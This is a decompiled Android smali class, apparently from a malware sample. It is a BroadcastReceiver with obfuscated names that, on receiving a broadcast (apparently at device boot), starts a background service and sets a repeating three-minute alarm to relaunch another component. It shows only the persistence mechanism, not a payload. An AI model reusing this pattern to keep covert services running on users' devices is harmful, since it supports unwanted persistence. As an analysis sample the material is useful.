.class public Lbarak/obama/badgirl/PriZagruzkeUstroystv;
.super Landroid/content/BroadcastReceiver;


# instance fields
.field private doluckamanas:Landroid/content/Intent;

.field private nemonkeys:Landroid/app/AlarmManager;

.field private pamazonu:Landroid/app/PendingIntent;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public nemolltes(Landroid/content/Context;)V
    .locals 7

    const-wide/32 v4, 0x2bf20

    const/4 v1, 0x0

    const-string v0, "alarm"

    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    iput-object v0, p0, Lbarak/obama/badgirl/PriZagruzkeUstroystv;->nemonkeys:Landroid/app/AlarmManager;

    new-instance v0, Landroid/content/Intent;

    const-class v2, Lbarak/obama/badgirl/QequqarQndr;

    invoke-direct {v0, p1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iput-object v0, p0, Lbarak/obama/badgirl/PriZagruzkeUstroystv;->doluckamanas:Landroid/content/Intent;

    iget-object v0, p0, Lbarak/obama/badgirl/PriZagruzkeUstroystv;->doluckamanas:Landroid/content/Intent;

    invoke-static {p1, v1, v0, v1}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0

    iput-object v0, p0, Lbarak/obama/badgirl/PriZagruzkeUstroystv;->pamazonu:Landroid/app/PendingIntent;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    add-long/2addr v2, v4

    iget-object v0, p0, Lbarak/obama/badgirl/PriZagruzkeUstroystv;->nemonkeys:Landroid/app/AlarmManager;

    iget-object v6, p0, Lbarak/obama/badgirl/PriZagruzkeUstroystv;->pamazonu:Landroid/app/PendingIntent;

    invoke-virtual/range {v0 .. v6}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V

    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 2

    invoke-virtual {p0, p1}, Lbarak/obama/badgirl/PriZagruzkeUstroystv;->nemolltes(Landroid/content/Context;)V

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lbarak/obama/badgirl/BigService;

    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return-void
.end method
